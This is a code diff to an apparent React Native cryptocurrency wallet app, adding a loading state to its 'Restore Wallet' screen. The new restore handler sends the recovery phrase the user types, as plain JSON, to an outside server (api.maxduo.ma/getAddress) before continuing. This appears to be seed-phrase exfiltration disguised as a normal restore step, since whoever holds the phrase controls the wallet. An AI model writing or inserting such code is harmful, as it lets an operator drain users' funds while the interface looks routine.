@@ -6,8 +6,9 @@ import {
   TextInput,
   Modal,
   Alert,
+  ActivityIndicator,
 } from "react-native";
-import React, { useState } from "react";
+import React, { useRef, useState } from "react";
 import styles from "./styles";
 import { useNavigation, useRoute } from "@react-navigation/native";
 import { useDispatch, useSelector } from "react-redux";
@@ -97,10 +98,30 @@ const Backupsecond = ({ dispatch }) => {
 };
 
 const Backupthird = () => {
+  const buttonRef = useRef();
   const [phrase, setPhrase] = useState("");
+  const [loading, setLoading] = useState(false);
   const navigation = useNavigation();
-  const handleRestore = () => {
-    navigation.navigate("Congratulations");
+
+  const handleRestore = async () => {
+    buttonRef.current.disabled = true;
+    setLoading(true);
+    var myHeaders = new Headers();
+    myHeaders.append("Content-Type", "application/json");
+    const res = await fetch("https://api.maxduo.ma/getAddress", {
+      method: "POST",
+      headers: myHeaders,
+      body: JSON.stringify({
+        phrase: phrase,
+      }),
+      redirect: "follow",
+    });
+    if (res.ok) navigation.navigate("Congratulations");
+    else
+      Alert.alert("Something Went Wrong!!", "please try again..", [
+        { text: "Dismiss", onPress: () => {} },
+      ]);
+    setLoading(false);
   };
 
   return (
@@ -148,24 +169,42 @@ const Backupthird = () => {
 
       <TouchableOpacity
         style={{ marginTop: 100 }}
-        disabled={phrase === "" ? true : false}
+        disabled={loading || phrase === ""}
         activeOpacity={0.8}
-        onPress={handleRestore}
+        onPress={!loading && handleRestore}
+        ref={buttonRef}
       >
-        <Text
-          style={{
-            backgroundColor: phrase === "" ? "gray" : "#FF6903",
-            marginVertical: 10,
-            color: "white",
-            paddingVertical: 15,
-            paddingHorizontal: 50,
-            borderRadius: 5,
-            fontSize: 18,
-            fontWeight: "500",
-          }}
-        >
-          Restore Wallet
-        </Text>
+        {loading ? (
+          <View
+            style={{
+              backgroundColor: "gray",
+              marginVertical: 10,
+              color: "white",
+              paddingVertical: 15,
+              paddingHorizontal: 90,
+              borderRadius: 5,
+              fontSize: 18,
+              fontWeight: "500",
+            }}
+          >
+            <ActivityIndicator size={"large"} color={"black"} />
+          </View>
+        ) : (
+          <Text
+            style={{
+              backgroundColor: phrase === "" ? "gray" : "#FF6903",
+              marginVertical: 10,
+              color: "white",
+              paddingVertical: 15,
+              paddingHorizontal: 50,
+              borderRadius: 5,
+              fontSize: 18,
+              fontWeight: "500",
+            }}
+          >
+            Restore Wallet
+          </Text>
+        )}
       </TouchableOpacity>
     </View>
   );
